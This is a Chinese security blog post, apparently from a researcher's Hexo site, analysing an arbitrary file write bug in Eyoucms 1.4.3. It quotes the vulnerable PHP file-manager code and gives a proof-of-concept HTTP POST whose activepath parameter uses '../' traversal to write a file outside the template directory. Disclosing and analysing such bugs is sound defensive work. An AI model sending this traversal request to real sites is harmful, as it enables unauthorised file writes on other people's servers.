@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Eyoucms 1.4.3 任意文件写入一、漏洞简介可写入html,css,js,txt文件，总体来说比较鸡肋。 二、漏洞影响Eyoucms 1.4.3 三、复现过程漏洞分析漏洞点只对filename进行过滤，而忘了activepath也可以..&#x2F;进行跳转application&#x2F;admin&#x2F;controller&#x2F;Filemanager.php   if (IS_POST) &amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Eyoucms 1.4.3 任意文件写入一、漏洞简介可写入html,css,js,txt文件，总体来说比较鸡肋。 二、漏洞影响Eyoucms 1.4.3 三、复现过程漏洞分析漏洞点只对filename进行过滤，而忘了activepath也可以..&#x2F;进行跳转application&#x2F;admin&#x2F;controller&#x2F;Filemanager.php   if (IS_POST) &amp;#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:55.970Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Eyoucms/Eyoucms 1.4.3 任意文件写入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.970Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-4-3-任意文件写入"><a href="#Eyoucms-1-4-3-任意文件写入" class="headerlink" title="Eyoucms 1.4.3 任意文件写入"></a>Eyoucms 1.4.3 任意文件写入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>可写入html,css,js,txt文件，总体来说比较鸡肋。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.4.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点只对<code>filename</code>进行过滤，而忘了<code>activepath</code>也可以<code>../</code>进行跳转<br><code>application/admin/controller/Filemanager.php</code></p>
+<pre><code>  if (IS_POST) &#123;
+         $post = input(&#39;post.&#39;, &#39;&#39;, null);
+         $content = input(&#39;post.content&#39;, &#39;&#39;, null);
+         $filename = !empty($post[&#39;filename&#39;]) ? trim($post[&#39;filename&#39;]) : &#39;&#39;;
+         $content = !empty($content) ? $content : &#39;&#39;;
+         $activepath = !empty($post[&#39;activepath&#39;]) ? trim($post[&#39;activepath&#39;]) : &#39;&#39;;
+
+             ... ...
+
+         $r = $this-&gt;filemanagerLogic-&gt;editFile($filename, $activepath, $content);
+         if ($r === true) &#123;
+             $this-&gt;success(&#39;操作成功！&#39;, url(&#39;Filemanager/index&#39;, array(&#39;activepath&#39;=&gt;$this-&gt;filemanagerLogic-&gt;replace_path($activepath, &#39;:&#39;, false))));
+             exit;
+         &#125; else &#123;
+             ... ...
+</code></pre>
+<p>跟进<code>editFile</code>函数</p>
+<pre><code>application/admin/logic/FilemanagerLogic.php
+ public function editFile($filename, $activepath = &#39;&#39;, $content = &#39;&#39;)
+ &#123;
+     $fileinfo = pathinfo($filename);// pathinfo获取后缀
+     $ext = strtolower($fileinfo[&#39;extension&#39;]);
+
+     ......
+
+     /*允许编辑的文件类型*/
+     if (!in_array($ext, $this-&gt;editExt)) &#123; //&lt;&lt;&lt;&lt;&lt;基于白名单，暂时没有想到绕过的方法&gt;&gt;&gt;&gt;&gt;
+         return &#39;只允许操作文件类型如下：&#39;.implode(&#39;|&#39;, $this-&gt;editExt);
+     &#125;
+     /*--end*/
+
+     $filename = str_replace(&quot;..&quot;, &quot;&quot;, $filename);// 仅对filename进行过滤
+     $file = $this-&gt;baseDir.&quot;$activepath/$filename&quot;; // 此处直接拼接产生漏洞
+     if (!is_writable(dirname($file))) &#123;
+         return &quot;请把模板文件目录设置为可写入权限！&quot;;
+     &#125;
+     if (&#39;css&#39; != $ext) &#123;
+         $content = htmlspecialchars_decode($content, ENT_QUOTES);
+         $content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, &#39;intval(&#39;, $content);//
+         // $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;？ｍｕｍａ&quot;, $content);
+     &#125;
+     $fp = fopen($file, &quot;w&quot;);
+     fputs($fp, $content);
+     fclose($fp);
+     return true;
+ &#125;
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code> POST /eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;lang=cn HTTP/1.1
+ Host: 127.0.0.1
+ User-Agent: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+ Accept-Encoding: gzip, deflate
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 94
+ Origin: http://127.0.0.1
+ Connection: close
+ Referer: http://127.0.0.1/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;activepath=%3Atemplate%3Aplugins%3Atest&amp;lang=cn
+ Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705
+ Upgrade-Insecure-Requests: 1
+
+ activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&amp;filename=newfile.htm&amp;content=test
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" data-id="cl5c2qony006oy8v15ul24i9j" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
